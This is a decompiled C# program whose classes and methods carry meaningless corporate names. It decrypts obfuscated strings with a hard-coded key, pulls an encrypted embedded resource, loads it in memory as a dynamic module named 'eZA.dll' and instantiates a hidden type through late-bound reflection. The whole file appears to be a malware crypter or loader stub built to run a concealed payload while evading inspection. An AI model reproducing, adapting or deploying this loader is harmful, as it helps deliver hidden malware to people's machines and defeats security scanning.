using System;
using System.Collections;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace LennarCorporation;

public class PerformanceFoodGroupCo
{
	public static object GoldenStateBancorpInc(byte[] USFreighwaysCorporation)
	{
		checked
		{
			byte[] array = new byte[USFreighwaysCorporation.Length - 1 + 1];
			byte b = USFreighwaysCorporation[USFreighwaysCorporation.Length - 1];
			object bytes = Encoding.Default.GetBytes("S03PD2KD3OOSVK58KN7BMELJV4SPZN79UJNFO0HYR7KSS3ATHG6SIPFNYP6JH6OLTP9L8ZPKFHSR543549HPSLZEE0R9E8OYO90B5ZYT2SMB8ZT61ARIY05H34H8FRGH37B7410DKY100YGOOYHDNG0PE2IAP1NHLEIBYZBAAM80I5IEV3RRID5T7U2BP9YVHRY6MF43VHCBIAGKRENZH79HK1EC80TB2K2");
			Array.Resize(ref array, array.Length - 1);
			object obj = typeof(NortekInc);
			Type typeFromHandle = typeof(Activator);
			object[] array2 = new object[1] { RuntimeHelpers.GetObjectValue(obj) };
			object[] array3 = array2;
			bool[] array4 = new bool[1] { true };
			object obj2 = NewLateBinding.LateGet((object)null, typeFromHandle, "CreateInstance", array3, (string[])null, (Type[])null, array4);
			if (array4[0])
			{
				obj = RuntimeHelpers.GetObjectValue(array2[0]);
			}
			object objectValue = RuntimeHelpers.GetObjectValue(obj2);
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				object obj3 = NewLateBinding.LateGet(obj, (Type)null, "GetMethod", new object[1] { "PNMResourcesInc" }, (string[])null, (Type[])null, (bool[])null);
				object[] array5 = new object[2]
				{
					RuntimeHelpers.GetObjectValue(objectValue),
					new object[2]
					{
						USFreighwaysCorporation[i],
						b
					}
				};
				object[] array6 = array5;
				array4 = new bool[2] { true, false };
				object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "Invoke", array6, (string[])null, (Type[])null, array4);
				if (array4[0])
				{
					objectValue = RuntimeHelpers.GetObjectValue(array5[0]);
				}
				object objectValue2 = RuntimeHelpers.GetObjectValue(obj4);
				object obj5 = NewLateBinding.LateGet(obj, (Type)null, "GetMethod", new object[1] { "PNMResourcesInc" }, (string[])null, (Type[])null, (bool[])null);
				object[] array7 = new object[2]
				{
					RuntimeHelpers.GetObjectValue(objectValue),
					new object[2]
					{
						RuntimeHelpers.GetObjectValue(objectValue2),
						RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(bytes, new object[1] { Operators.ModObject((object)i, NewLateBinding.LateGet(bytes, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null)) }, (string[])null))
					}
				};
				array4 = new bool[2] { true, false };
				object obj6 = NewLateBinding.LateGet(obj5, (Type)null, "Invoke", array7, (string[])null, (Type[])null, array4);
				if (array4[0])
				{
					objectValue = RuntimeHelpers.GetObjectValue(array7[0]);
				}
				object objectValue3 = RuntimeHelpers.GetObjectValue(obj6);
				array[array.Length - 1 - i] = Conversions.ToByte(objectValue3);
			}
			return array;
		}
	}

	[STAThread]
	public static void Main()
	{
		object @string = Encoding.Default.GetString((byte[])GoldenStateBancorpInc(new byte[27]
		{
			20, 98, 111, 3, 31, 127, 6, 59, 35, 31,
			30, 4, 28, 22, 110, 106, 19, 21, 91, 82,
			30, 30, 6, 7, 17, 89, 62
		}));
		object string2 = Encoding.Default.GetString((byte[])GoldenStateBancorpInc(new byte[17]
		{
			20, 98, 111, 3, 31, 127, 6, 59, 116, 3,
			5, 3, 45, 1, 110, 65, 62
		}));
		object string3 = Encoding.Default.GetString((byte[])GoldenStateBancorpInc(new byte[17]
		{
			31, 97, 121, 15, 12, 101, 1, 25, 76, 95,
			28, 8, 28, 6, 114, 85, 62
		}));
		object string4 = Encoding.Default.GetString((byte[])GoldenStateBancorpInc(new byte[15]
		{
			8, 109, 99, 15, 14, 127, 27, 51, 104, 5,
			16, 8, 26, 54, 62
		}));
		object string5 = Encoding.Default.GetString((byte[])GoldenStateBancorpInc(new byte[33]
		{
			31, 107, 106, 15, 20, 109, 56, 31, 110, 3,
			4, 2, 27, 16, 89, 40, 6, 21, 106, 14,
			6, 20, 1, 17, 58, 36, 0, 11, 16, 3,
			112, 84, 62
		}));
		object string6 = Encoding.Default.GetString((byte[])GoldenStateBancorpInc(new byte[14]
		{
			30, 107, 110, 28, 15, 99, 6, 31, 95, 95,
			48, 55, 13, 62
		}));
		object string7 = Encoding.Default.GetString((byte[])GoldenStateBancorpInc(new byte[10] { 25, 109, 104, 4, 24, 67, 1, 31, 74, 62 }));
		object string8 = Encoding.Default.GetString((byte[])GoldenStateBancorpInc(new byte[3] { 37, 66, 65 }));
		Encoding.Default.GetString((byte[])GoldenStateBancorpInc(new byte[5] { 9, 111, 98, 34, 62 }));
		object string9 = Encoding.Default.GetString((byte[])GoldenStateBancorpInc(new byte[8] { 8, 126, 116, 58, 14, 105, 50, 62 }));
		object obj = "eZA";
		object type = Type.GetType(Encoding.Default.GetString((byte[])GoldenStateBancorpInc(new byte[12]
		{
			8, 126, 116, 58, 84, 97, 16, 14, 126, 8,
			34, 62
		})));
		object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)type, Conversions.ToString(string9), new object[1] { RuntimeHelpers.GetObjectValue(@string) }, (string[])null, (Type[])null, (bool[])null));
		object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)type, Conversions.ToString(string9), new object[1] { RuntimeHelpers.GetObjectValue(string5) }, (string[])null, (Type[])null, (bool[])null));
		object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)type, Conversions.ToString(string9), new object[1] { RuntimeHelpers.GetObjectValue(string3) }, (string[])null, (Type[])null, (bool[])null));
		object objectValue4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)objectValue, Conversions.ToString(string2), new object[0], (string[])null, (Type[])null, (bool[])null));
		object objectValue5 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)objectValue3, Conversions.ToString(string4), new object[3]
		{
			RuntimeHelpers.GetObjectValue(objectValue2),
			RuntimeHelpers.GetObjectValue(string6),
			RuntimeHelpers.GetObjectValue(objectValue4)
		}, (string[])null, (Type[])null, (bool[])null));
		object objectValue6 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue5), (Type)null, Conversions.ToString(string7), new object[1] { RuntimeHelpers.GetObjectValue(string8) }, (string[])null, (Type[])null, (bool[])null));
		object objectValue7 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)type, Conversions.ToString(string9), new object[1] { "System.Reflection.AssemblyName" }, (string[])null, (Type[])null, (bool[])null));
		object objectValue8 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)type, Conversions.ToString(string9), new object[1] { "System.AppDomain" }, (string[])null, (Type[])null, (bool[])null));
		object objectValue9 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)objectValue8, "CurrentDomain", new object[0], (string[])null, (Type[])null, (bool[])null));
		object objectValue10 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)NewLateBinding.LateGet((object)null, (Type)type, Conversions.ToString(string9), new object[1] { RuntimeHelpers.GetObjectValue(string3) }, (string[])null, (Type[])null, (bool[])null), "CreateInstance", new object[2]
		{
			RuntimeHelpers.GetObjectValue(objectValue7),
			new object[1] { "TempAssembly" }
		}, (string[])null, (Type[])null, (bool[])null));
		object objectValue11 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue9), (Type)null, "DefineDynamicAssembly", new object[2]
		{
			RuntimeHelpers.GetObjectValue(objectValue10),
			AssemblyBuilderAccess.Run
		}, (string[])null, (Type[])null, (bool[])null));
		object objectValue12 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue11), (Type)null, "DefineDynamicModule", new object[1] { "TempModule" }, (string[])null, (Type[])null, (bool[])null));
		RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue11), (Type)null, "DefineDynamicModule", new object[1] { "eZA.dll" }, (string[])null, (Type[])null, (bool[])null));
		object objectValue13 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue12), (Type)null, "DefineType", new object[2]
		{
			"TempClass",
			TypeAttributes.Public
		}, (string[])null, (Type[])null, (bool[])null));
		NewLateBinding.LateCall(objectValue13, (Type)null, "CreateType", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object objectValue14 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue11), (Type)null, "LoadModule", new object[2]
		{
			"eZA.dll",
			RuntimeHelpers.GetObjectValue(GoldenStateBancorpInc((byte[])NewLateBinding.LateIndexGet(objectValue6, new object[1] { 1 }, (string[])null)))
		}, (string[])null, (Type[])null, (bool[])null));
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((IEnumerable)NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue14), (Type)null, "GetTypes", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
			while (enumerator.MoveNext())
			{
				object objectValue15 = RuntimeHelpers.GetObjectValue(enumerator.Current);
				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(objectValue15, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), obj, false))
				{
					RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)NewLateBinding.LateGet((object)null, (Type)type, Conversions.ToString(string9), new object[1] { RuntimeHelpers.GetObjectValue(string3) }, (string[])null, (Type[])null, (bool[])null), "CreateInstance", new object[1] { RuntimeHelpers.GetObjectValue(objectValue15) }, (string[])null, (Type[])null, (bool[])null));
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}
}
